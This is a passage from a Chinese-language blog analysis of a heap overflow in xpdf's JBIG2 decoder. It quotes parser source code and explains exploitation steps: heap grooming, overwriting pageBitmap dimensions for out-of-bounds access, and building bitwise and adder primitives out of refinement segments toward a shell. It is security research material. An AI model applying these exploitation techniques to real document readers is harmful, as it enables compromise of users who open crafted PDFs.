sizeof(JBIG2Bitmap *));</span><br><span class="line">  kk &#x3D; 0;</span><br><span class="line">  for (i &#x3D; 0; i &lt; nRefSegs; ++i) &#123;</span><br><span class="line">    if ((seg &#x3D; findSegment(refSegs[i]))) &#123;</span><br><span class="line">      if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegSymbolDict) &#123;</span><br><span class="line">        symbolDict &#x3D; (JBIG2SymbolDict *)seg;</span><br><span class="line">        &#x2F;&#x2F; 4. 将各个指针写入该堆内存，触发堆溢出</span><br><span class="line">        for (k &#x3D; 0; k &lt; symbolDict-&gt;getSize(); ++k) &#123;</span><br><span class="line">          syms[kk++] &#x3D; symbolDict-&gt;getBitmap(k);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于恶意构造的 <code>refSegs</code> 中，一些 <code>seg-&gt;getSize()</code> 值很大（4GB），因此如果全部写进则肯定会触发 crash。所以在实际的漏洞利用中，会尝试先做做堆风水：</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2022-02-10-095522.jpg" alt=""></p><p>看图，exploit 需要将 <strong>segments GList 的后备存储</strong>，放置在<strong>刚刚创建的溢出堆块</strong>的<strong>高地址</strong>处。这样触发堆溢出时，就能在执行前几个正常 size 的写入操作时，<strong>将后备存储中的那个超大 size 所对应的 segment 指针，替换成非 JBIG2SymbolDict 类型的 segment 指针（即 JBIG2Bitmap 类型）</strong>。之后当程序检索这个 segment 指针时，就会跳过该指针的检索。</p><h2 id="四、漏洞利用前置知识"><a href="#四、漏洞利用前置知识" class="headerlink" title="四、漏洞利用前置知识"></a>四、漏洞利用前置知识</h2><h3 id="1-JBIG2Decode"><a href="#1-JBIG2Decode" class="headerlink" title="1. JBIG2Decode"></a>1. JBIG2Decode</h3><p>漏洞点位于 JBIG2Stream ，而 JBIG2Stream 又怎么存在于 pdf 中呢？</p><p>pdf 文件结构本质上是一个树状图，这里给出一个使用 JBIG2Stream 的 pdf 片段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">4 0 obj</span><br><span class="line">&lt;&lt; &#x2F;Filter &#x2F;FlateDecode</span><br><span class="line">&#x2F;Length 3988</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&#x2F;* [MyStream1] *&#x2F;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt; &#x2F;DecodeParms  &lt;&lt; &#x2F;JBIG2Globals 4 0 R &gt;&gt;</span><br><span class="line">&#x2F;Width 1024</span><br><span class="line">&#x2F;ColorSpace &#x2F;DeviceGray</span><br><span class="line">&#x2F;Height 1</span><br><span class="line">&#x2F;Filter &#x2F;JBIG2Decode</span><br><span class="line">&#x2F;Subtype &#x2F;Image</span><br><span class="line">&#x2F;Length 418248</span><br><span class="line">&#x2F;Type &#x2F;XObject</span><br><span class="line">&#x2F;BitsPerComponent 1</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&#x2F;* [MyStream2] *&#x2F;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure><blockquote><p>pdf 文件中，4 0 obj、5 0 obj 都是表示一个特定的 pdf object。</p></blockquote><p>其中，<code>4 0 obj</code> 标识了下面中的 <code>MyStream1</code>，其参数 <code>/Filter /FlateDecode</code> 表示该流是使用 zlib 压缩。</p><p>继续往下看可以看到： <code>5 0 obj</code> 中，<code>/DecodeParms</code> 引用了 <code>4 0 obj</code> 中的 stream 流，即 <code>MyStream1</code>；同时参数 <code>/Filter /JBIG2Decode</code> 指定了接下来的流 <code>MyStream2</code> 使用的解码方式是 <code>JBIG2Decode</code>。</p><p>因此从上文可以得知，<code>MyStream2</code> 使用 <strong>JBIG2Decode</strong> 进行解码，其解码参数为上面引用的这个 <code>4 0 obj</code>，即 <code>MyStream1</code> 使用 <code>FlateDecode</code> <strong>所解码后的流</strong>，而该参数的键为 <code>JBIG2Globals</code>。</p><p>而我们要做的，就是精心构建 <code>MyStream1</code> 和 <code>MyStream2</code>（这两个流都是 JBIG2Stream），使其在解析这两个 Stream 时能触发漏洞，从而 get shell。</p><p>构建好这两个流后，可以使用 <a href="https://github.com/agl/jbig2enc/blob/master/pdf.py" target="_blank" rel="noopener">jbig2enc/pdf.py</a> 来创建出 pdf。</p><h3 id="2-Segments-小叙"><a href="#2-Segments-小叙" class="headerlink" title="2. Segments 小叙"></a>2. Segments 小叙</h3><blockquote><p>注，这一节中，每个 segment 所对应的代码最好亲自阅读一下。</p></blockquote><p>当 xpdf 对 JBIG2Stream 解码时，正如上节中所示，JBIG2Decode 需要一个参数 <code>JBIG2Globals</code>。因此在解析时，会先解析 <code>JBIG2Globals</code> 的 stream，之后再解析下面的 main stream。以下代码说明了 stream 的解析过程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JBIG2Stream::reset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    GList *t;</span><br><span class="line"></span><br><span class="line">    segments = <span class="keyword">new</span> GList();</span><br><span class="line">    globalSegments = <span class="keyword">new</span> GList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the globals stream</span></span><br><span class="line">    <span class="keyword">if</span> (globalsStream.isStream())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 解析以 DecodeParms 传来的 global stream 流，即 FlateDecode(MyStream1)</span></span><br><span class="line">        curStr = globalsStream.getStream();</span><br><span class="line">        curStr-&gt;reset();</span><br><span class="line">        <span class="comment">// 解析时需要使用到解码器，这里是对解码器进行初始化</span></span><br><span class="line">        arithDecoder-&gt;setStream(curStr);</span><br><span class="line">        huffDecoder-&gt;setStream(curStr);</span><br><span class="line">        mmrDecoder-&gt;setStream(curStr);</span><br><span class="line">        <span class="comment">// 开始读取 segments</span></span><br><span class="line">        readSegments();</span><br><span class="line">        curStr-&gt;close();</span><br><span class="line">        <span class="comment">// swap the newly read segments list into globalSegments</span></span><br><span class="line">        t = segments;</span><br><span class="line">        segments = globalSegments;</span><br><span class="line">        globalSegments = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read the main stream</span></span><br><span class="line">    <span class="comment">// 解析 main stream, 即 MySteram2</span></span><br><span class="line">    curStr = str;</span><br><span class="line">    curStr-&gt;reset();</span><br><span class="line">    <span class="comment">// 同样对解码器进行初始化</span></span><br><span class="line">    arithDecoder-&gt;setStream(curStr);</span><br><span class="line">    huffDecoder-&gt;setStream(curStr);</span><br><span class="line">    mmrDecoder-&gt;setStream(curStr);</span><br><span class="line">    readSegments();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pageBitmap)</span><br><span class="line">    &#123;</span><br><span class="line">        dataPtr = pageBitmap-&gt;getDataPtr();</span><br><span class="line">        dataEnd = dataPtr + pageBitmap-&gt;getDataSize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        dataPtr = dataEnd = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以了解到，<strong>JBIG2Stream 是由多个 Segment 组成的</strong>，Segment 种类较多。这里我们只关注几个有用到的 Segment。</p><h3 id="a-EOFSeg"><a href="#a-EOFSeg" class="headerlink" title="a. EOFSeg"></a>a. EOFSeg</h3><p>该 Segment 的解析标志了完成了全部 segment 的读取，没有其他用途。</p><h3 id="b-SymbolDictSeg"><a href="#b-SymbolDictSeg" class="headerlink" title="b. SymbolDictSeg"></a>b. SymbolDictSeg</h3><p>SymbolDict 主要存放了<strong>一个指向 Bitmap 的指针数组</strong>。Bitmap 可以用于存放数据，在实际漏洞利用中将起到类似内存的作用。</p><p>对于每个 symbol dict 中的 Bitmap，规范中将其称为一个 <strong>instance</strong>。</p><p>解析 SymbolDictSeg 时，将会从 stream 中读取并创建出每一个 Bitmap。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">GBool JBIG2Stream::readSymbolDictSeg(Guint segNum, Guint length,</span><br><span class="line">                                     Guint *refSegs, Guint nRefSegs)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; 创建 bitmaps 数组</span><br><span class="line">    &#x2F;&#x2F; get the input symbol bitmaps</span><br><span class="line">    bitmaps &#x3D; (JBIG2Bitmap **)gmallocn(numInputSyms + numNewSyms,</span><br><span class="line">                                       sizeof(JBIG2Bitmap *));</span><br><span class="line">    for (i &#x3D; 0; i &lt; numInputSyms + numNewSyms; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        bitmaps[i] &#x3D; NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    k &#x3D; 0;</span><br><span class="line">    inputSymbolDict &#x3D; NULL;</span><br><span class="line">    for (i &#x3D; 0; i &lt; nRefSegs; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        if ((seg &#x3D; findSegment(refSegs[i])))</span><br><span class="line">        &#123;</span><br><span class="line">            if (seg-&gt;getType() &#x3D;&#x3D; jbig2SegSymbolDict)</span><br><span class="line">            &#123;</span><br><span class="line">                inputSymbolDict &#x3D; (JBIG2SymbolDict *)seg;</span><br><span class="line">                for (j &#x3D; 0; j &lt; inputSymbolDict-&gt;getSize(); ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    bitmaps[k++] &#x3D; inputSymbolDict-&gt;getBitmap(j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; 开始尝试从外部 JBIG2Stream 流中读取 bitmap</span><br><span class="line">    symHeight &#x3D; 0;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    while (i &lt; numNewSyms)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; read the height class delta height</span><br><span class="line">        if (huff) [...]</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            arithDecoder-&gt;decodeInt(&amp;dh, iadhStats);</span><br><span class="line">        &#125;</span><br><span class="line">        [...]</span><br><span class="line">        symHeight +&#x3D; dh;</span><br><span class="line">        symWidth &#x3D; 0;</span><br><span class="line">        totalWidth &#x3D; 0;</span><br><span class="line">        j &#x3D; i;</span><br><span class="line"></span><br><span class="line">        [...]</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; read the symbols in this height class</span><br><span class="line">        while (1)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; read the delta width</span><br><span class="line">            if (huff) [...]</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if (!arithDecoder-&gt;decodeInt(&amp;dw, iadwStats))</span><br><span class="line">                &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            [...]</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; using a collective bitmap, so don&#39;t read a bitmap here</span><br><span class="line">            if (huff &amp;&amp; !refAgg) [...]</span><br><span class="line">            else if (refAgg) [...]</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; 从外部流中读取 bitmap 并将其保存进数组中</span><br><span class="line">                bitmaps[numInputSyms + i] &#x3D;</span><br><span class="line">                    readGenericBitmap(gFalse, symWidth, symHeight,</span><br><span class="line">                                    sdTemplate, gFalse, gFalse, NULL,</span><br><span class="line">                                    sdATX, sdATY, 0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; read the collective bitmap</span><br><span class="line">        if (huff &amp;&amp; !refAgg) [...]</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 创建了一个 symbolDict 结构体</span><br><span class="line">    &#x2F;&#x2F; create the symbol dict object</span><br><span class="line">    symbolDict &#x3D; new JBIG2SymbolDict(segNum, numExSyms);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 将上面创建的 bitmaps 数组复制进 symbolDict 结构体中</span><br><span class="line">    &#x2F;&#x2F; exported symbol list</span><br><span class="line">    i &#x3D; j &#x3D; 0;</span><br><span class="line">    ex &#x3D; gFalse;</span><br><span class="line">    prevRun &#x3D; 1;</span><br><span class="line">    while (i &lt; numInputSyms + numNewSyms)</span><br><span class="line">    &#123;</span><br><span class="line">        if (huff)</span><br><span class="line">            [...]</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            arithDecoder-&gt;decodeInt(&amp;run, iaexStats);</span><br><span class="line">        &#125;</span><br><span class="line">        [...]</span><br><span class="line">        if (ex)</span><br><span class="line">        &#123;</span><br><span class="line">            for (cnt &#x3D; 0; cnt &lt; run; ++cnt)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; 将上面创建的 bitmaps 对等深拷贝进 symbolDict 中</span><br><span class="line">                symbolDict-&gt;setBitmap(j++, bitmaps[i++]-&gt;copy());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            i +&#x3D; run;</span><br><span class="line">        &#125;</span><br><span class="line">        ex &#x3D; !ex;</span><br><span class="line">        prevRun &#x3D; run;</span><br><span class="line">    &#125;</span><br><span class="line">    [...] &#x2F;&#x2F; 释放 bitmaps 数组</span><br><span class="line">    &#x2F;&#x2F; store the new symbol dict</span><br><span class="line">    segments-&gt;append(symbolDict);</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="c-PageInfoSeg"><a href="#c-PageInfoSeg" class="headerlink" title="c. PageInfoSeg"></a>c. PageInfoSeg</h3><p>对于每个 Page 来说，需要有一个 Bitmap 来表示当前页面渲染的数据。而在解析 PageInfoSeg 时，程序会创建一个流内全局 Bitmap：<strong>pageBitmap</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readPageInfoSeg(Guint length)</span><br><span class="line">&#123;</span><br><span class="line">    Guint xRes, yRes, flags, striping;</span><br><span class="line"></span><br><span class="line">    if (!readULong(&amp;pageW) || !readULong(&amp;pageH) ||</span><br><span class="line">        !readULong(&amp;xRes) || !readULong(&amp;yRes) ||</span><br><span class="line">        !readUByte(&amp;flags) || !readUWord(&amp;striping))</span><br><span class="line">    &#123;</span><br><span class="line">        goto eofError;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; 创建流内全局字段 pageBitmap</span><br><span class="line">    pageBitmap &#x3D; new JBIG2Bitmap(0, pageW, curPageH);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; default pixel value</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">eofError:</span><br><span class="line">    error(errSyntaxError, getPos(), &quot;Unexpected EOF in JBIG2 stream&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，<strong>pageBitmap 很关键</strong>，它表示了一个 Page 的 bitmap。我们将使用堆溢出来覆写 pageBitmap 的 Width 和 Height，进而达到越界读写的目的。</p><blockquote><p>同时 PageInfoSeg 还可用于绕过一个 sanity check，下文中会提到。</p></blockquote><h3 id="d-GenericRegionSeg"><a href="#d-GenericRegionSeg" class="headerlink" title="d. GenericRegionSeg"></a>d. GenericRegionSeg</h3><p>GenericRegionSeg 的解析将会<strong>从流中读取一个 Bitmap</strong>，并<strong>与当前的 pageBitmap 的特定区域进行运算</strong>：</p><blockquote><p>需要注意的是，JBIG2Globals Stream 中的 Segment 不允许引用任何 Segment，因此 GenericRegionSeg 不能存放在 JBIG2Globals 流中。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readGenericRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                                       GBool lossless, Guint length)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; read the bitmap</span><br><span class="line">    bitmap &#x3D; readGenericBitmap(mmr, w, h, templ, tpgdOn, gFalse,</span><br><span class="line">                               NULL, atx, aty, mmr ? length - 18 : 0);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; combine the region bitmap into the page bitmap</span><br><span class="line">    if (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        if (pageH &#x3D;&#x3D; 0xffffffff &amp;&amp; y + h &gt; curPageH)</span><br><span class="line">        &#123;</span><br><span class="line">            pageBitmap-&gt;expand(y + h, pageDefPixel);</span><br><span class="line">        &#125;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        delete bitmap;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; store the region bitmap</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，从流中读取 Bitmap 的操作位于 <code>readGenericBitmap</code> 函数中，读取的操作需要使用到<strong>编码器</strong>。</p><p>而与 pageBitmap 的运算主要是使用 <code>JBIG2Bitmap::combine</code> 方法，该方法中有五种运算方式，分别是 <strong>与、或、异或和替换</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">switch (combOp)</span><br><span class="line">&#123;</span><br><span class="line">    case 0: &#x2F;&#x2F; or</span><br><span class="line">        dest |&#x3D; src1 &amp; m2;</span><br><span class="line">        break;</span><br><span class="line">    case 1: &#x2F;&#x2F; and</span><br><span class="line">        dest &amp;&#x3D; src1 | m1;</span><br><span class="line">        break;</span><br><span class="line">    case 2: &#x2F;&#x2F; xor</span><br><span class="line">        dest ^&#x3D; src1 &amp; m2;</span><br><span class="line">        break;</span><br><span class="line">    case 3: &#x2F;&#x2F; xnor</span><br><span class="line">        dest ^&#x3D; (src1 ^ 0xff) &amp; m2;</span><br><span class="line">        break;</span><br><span class="line">    case 4: &#x2F;&#x2F; replace</span><br><span class="line">        dest &#x3D; (src1 &amp; m2) | (dest &amp; m1);</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们可以将外部的立即数，通过利用该段的解析过程，将其传入 pageBitmap 中等待进一步的运算。</p></blockquote><h3 id="e-GenericRefinementRegionSeg"><a href="#e-GenericRefinementRegionSeg" class="headerlink" title="e. GenericRefinementRegionSeg"></a>e. GenericRefinementRegionSeg</h3><p>GenericRefinementRegionSeg 的解析过程，组合起来可以对 pageBitmap 上的部分数据进行位运算。我们可以利用这里的位运算来构建加法器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readGenericRefinementRegionSeg(Guint segNum, GBool imm,</span><br><span class="line">                                                 GBool lossless, Guint length,</span><br><span class="line">                                                 Guint *refSegs,</span><br><span class="line">                                                 Guint nRefSegs)</span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    if (nRefSegs &#x3D;&#x3D; 1)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!(seg &#x3D; findSegment(refSegs[0])) ||</span><br><span class="line">            seg-&gt;getType() !&#x3D; jbig2SegBitmap)</span><br><span class="line">        &#123;</span><br><span class="line">            error(errSyntaxError, getPos(),</span><br><span class="line">                  &quot;Bad bitmap reference in JBIG2 generic refinement segment&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        refBitmap &#x3D; (JBIG2Bitmap *)seg;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        refBitmap &#x3D; pageBitmap-&gt;getSlice(x, y, w, h);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">    &#x2F;&#x2F; read</span><br><span class="line">    bitmap &#x3D; readGenericRefinementRegion(w, h, templ, tpgrOn,</span><br><span class="line">                                         refBitmap, 0, 0, atx, aty);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; combine the region bitmap into the page bitmap</span><br><span class="line">    if (imm)</span><br><span class="line">    &#123;</span><br><span class="line">        pageBitmap-&gt;combine(bitmap, x, y, extCombOp);</span><br><span class="line">        delete bitmap;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; store the region bitmap</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        bitmap-&gt;setSegNum(segNum);</span><br><span class="line">        segments-&gt;append(bitmap);</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>当 GenericRefinementRegionSeg <strong>不引用任何段时</strong>，变量 nRefSegs 为 0，此时 <strong>refBitmap 为 pageBitmap 上指定 x、y、w、h 属性的一块数据空间</strong>。</p><p> 由于函数 <code>readGenericRefinementRegion</code> 只会受到 refBitmap 的影响，因此我们可以认定传出的bitmap 变量等价于 pageBitmap 上特定区域的数据。</p><p> 接下来，若我们指定 imm 为 false，那么这块等价于 pageBitmap 上特定区域的数据，将被存储进 segments 数组中。</p></li><li><p>若下一次解析 GenericRefinementRegionSeg 时引用了第一步创建的段，那么此时 refBitmap 为第一步创建的 Bitmap。这样当 imm 为 true 时，第一步创建的 Bitmap 将会和 pageBitmap 上指定的位置进行 combine 操作，即位运算。</p></li><li><p>由于第一步创建的 bitmap 是和 pageBitmap 相关，因此整个过程就等价于</p><ul><li><p>从 pageBitmap 上<strong>特定位置1</strong>取下一块数据，并保存至 segments 上</p></li><li><p>从 segments 上取下这块数据，并将其与 pageBitmap 上<strong>特定位置2</strong>进行位运算。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+----------------------&gt; x-axis</span><br><span class="line">|</span><br><span class="line">|             .(2)</span><br><span class="line">|</span><br><span class="line">|    .(1)</span><br><span class="line">|</span><br><span class="line">V</span><br><span class="line">y-axis</span><br></pre></td></tr></table></figure></li></ul></li></ol><p>如此，便达到了<strong>让 pageBitmap 上指定两个位置的数据进行位运算的操作</strong>。我们将使用该操作来一步步构建位运算原语、乃至加法器。</p><h3 id="f-TextRegionSeg"><a href="#f-TextRegionSeg" class="headerlink" title="f. TextRegionSeg"></a>f. TextRegionSeg</h3><p>TextRegionSeg 可以<strong>引用</strong>指定的 <strong>SymbolDictSeg</strong>，并对其中的任意 instance 进行操作。</p><blockquote><p>需要注意的是，JBIG2Globals Stream 中的 Segment 不允许引用任何 Segment，因此 TextRegionSeg 不能存放在 JBIG2Globals 流中。</p></blockquote><p>整体流程大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 